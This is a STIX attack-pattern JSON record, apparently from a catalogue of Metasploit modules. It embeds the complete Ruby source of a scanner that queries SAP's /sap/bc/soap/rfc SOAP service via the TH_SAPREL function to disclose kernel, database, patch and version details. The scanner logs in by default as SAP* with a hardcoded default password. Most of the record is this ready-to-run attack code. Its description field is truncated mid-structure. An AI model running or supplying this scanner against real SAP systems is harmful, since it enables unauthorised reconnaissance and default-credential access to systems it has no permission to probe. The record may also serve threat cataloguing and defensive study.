{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c849a098-247e-40c0-944a-743eba56580f",
    "created": "2024-08-14T16:27:01.292213Z",
    "modified": "2024-08-14T16:27:01.292217Z",
    "name": "SAP /sap/bc/soap/rfc SOAP Service TH_SAPREL Function Information Disclosure",
    "description": " This module attempts to identify software, OS and DB versions through the SAP function TH_SAPREL using the /sap/bc/soap/rfc SOAP service.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/sap/sap_soap_th_saprel_disclosure.rb",
            "external_id": "sap_soap_th_saprel_disclosure.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# This module is based on, inspired by, or is a port of a plugin available in\n# the Onapsis Bizploit Opensource ERP Penetration Testing framework -\n# http://www.onapsis.com/research-free-solutions.php.\n# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts\n# in producing the Metasploit modules and was happy to share his knowledge and\n# experience - a very cool guy. I'd also like to thank Chris John Riley,\n# Ian de Villiers and Joris van de Vis who have Beta tested the modules and\n# provided excellent feedback. Some people just seem to enjoy hacking SAP :)\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name' => 'SAP /sap/bc/soap/rfc SOAP Service TH_SAPREL Function Information Disclosure',\n      'Description' => %q{\n          This module attempts to identify software, OS and DB versions through the SAP\n        function TH_SAPREL using the /sap/bc/soap/rfc SOAP service.\n      },\n      'References' =>\n        [\n          [ 'URL', 'https://labs.f-secure.com/tools/sap-metasploit-modules/' ]\n        ],\n      'Author' =>\n        [\n          'Agnivesh Sathasivam',\n          'nmonkee'\n        ],\n      'License' => MSF_LICENSE\n      )\n\n    register_options(\n      [\n        Opt::RPORT(8000),\n        OptString.new('CLIENT', [true, 'SAP Client', '001']),\n        OptString.new('HttpUsername', [true, 'Username', 'SAP*']),\n        OptString.new('HttpPassword', [true, 'Password', '06071992'])\n      ])\n  end\n\n  def run_host(ip)\n\n    data = '<?xml version=\"1.0\" encoding=\"utf-8\" ?>'\n    data << '<env:Envelope xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:env=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">'\n    data << '<env:Body>'\n    data << '<n1:TH_SAPREL xmlns:n1=\"urn:sap-com:document:sap:rfc:functions\" env:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">'\n    data << '</n1:TH_SAPREL>'\n    data << '</env:Body>'\n    data << '</env:Envelope>'\n\n    print_status(\"[SAP] #{ip}:#{rport} - sending SOAP TH_SAPREL request\")\n\n    begin\n      res = send_request_cgi({\n        'uri' => '/sap/bc/soap/rfc',\n        'method' => 'POST',\n        'data' => data,\n        'cookie' => \"sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}\",\n        'ctype' => 'text/xml; charset=UTF-8',\n        'encode_params' => false,\n        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),\n        'headers' => {\n          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',\n        },\n        'vars_get' => {\n          'sap-client'    => datastore['CLIENT'],\n          'sap-language'  => 'EN'\n        }\n      })\n      if res and res.code == 200\n        kern_comp_on = $1 if res.body =~ /<KERN_COMP_ON>(.*)<\\/KERN_COMP_ON>/i\n        kern_comp_time = $1 if res.body =~ /<KERN_COMP_TIME>(.*)<\\/KERN_COMP_TIME>/i\n        kern_dblib = $1 if res.body =~ /<KERN_DBLIB>(.*)<\\/KERN_DBLIB>/i\n        kern_patchlevel = $1 if res.body =~ /<KERN_PATCHLEVEL>(.*)<\\/KERN_PATCHLEVEL>/i\n        kern_rel =  $1 if res.body =~ /<KERN_REL>(.*)<\\/KERN_REL>/i\n        saptbl = Msf::Ui::Console::Table.new(\n          Msf::Ui::Console::Table::Style::Default,\n          'Header' => \"[SAP] System Info\",\n          'Prefix' => \"\\n\",\n          'Postfix' => \"\\n\",\n          'Indent' => 1,\n          'Columns' =>\n            [\n              \"Info\",\n              \"Value\"\n            ])\n        saptbl << [ \"OS Kernel version\", kern_comp_on ]\n        saptbl << [ \"SAP compile time\", kern_comp_time ]\n        saptbl << [ \"DB version\", kern_dblib ]\n        saptbl << [ \"SAP patch level\", kern_patchlevel ]\n        saptbl << [ \"SAP Version\", kern_rel ]\n        print(saptbl.to_s)\n\n        report_note(\n          :host => ip,\n          :proto => 'tcp',\n          :port => rport,\n          :sname => 'sap',\n          :type => 'os.kernel.version',\n          :data => \"OS Kernel version: #{kern_comp_on}\"\n        )\n\n        report_note(\n          :host => ip,\n          :proto => 'tcp',\n          :port => rport,\n          :sname => 'sap',\n          :type => 'sap.time.compile',\n          :data => \"SAP compile time: #{kern_comp_time}\"\n        )\n\n        report_note(\n          :host => ip,\n          :proto => 'tcp',\n          :port => rport,\n          :sname => 'sap',\n          :type => 'sap.db.version',\n          :data => \"DB version: #{kern_dblib}\"\n        )\n\n        report_note(\n          :host => ip,\n          :proto => 'tcp',\n          :port => rport,\n          :sname => 'sap',\n          :type => 'sap.version.patch_level',\n          :data => \"SAP patch level: #{kern_patchlevel}\"\n        )\n\n        report_note(\n          :host => ip,\n          :proto => 'tcp',\n          :port => rport,\n          :type => 'sap.version',\n          :data => \"SAP Version: #{kern_rel}\"\n        )\n\n      elsif res and res.code == 500\n        response = res.body\n        error.push(response.scan(%r{<message>(.*?)</message>}))\n        err = error.join().chomp\n        print_error(\"[SAP] #{ip}:#{rport} - #{err.gsub('&#39;','\\'')}\")\n        return\n      else\n        print_error(\"[SAP] #{ip}:#{rport} - error message: \" + res.code.to_s + \" \" + res.message) if res\n        return\n      end\n    rescue ::Rex::ConnectionError\n      print_error(\"[SAP] #{ip}:#{rport} - Unable to connect\")\n      return\n    end\n\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}